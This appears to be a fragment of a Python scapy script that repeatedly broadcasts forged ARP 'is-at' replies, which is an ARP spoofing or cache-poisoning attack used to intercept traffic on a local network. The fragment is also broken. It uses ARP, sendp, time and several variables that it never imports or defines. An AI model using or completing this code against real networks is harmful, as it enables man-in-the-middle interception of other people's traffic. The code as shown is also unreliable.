import sys
from scapy.all import sr1,IP,ICMP


arp = ARP(pdst=ip1,psrc=ip2,op="is-at")
packet = ethernet / arp
while True:
    sendp(packet, iface=iface)
    time.sleep(10)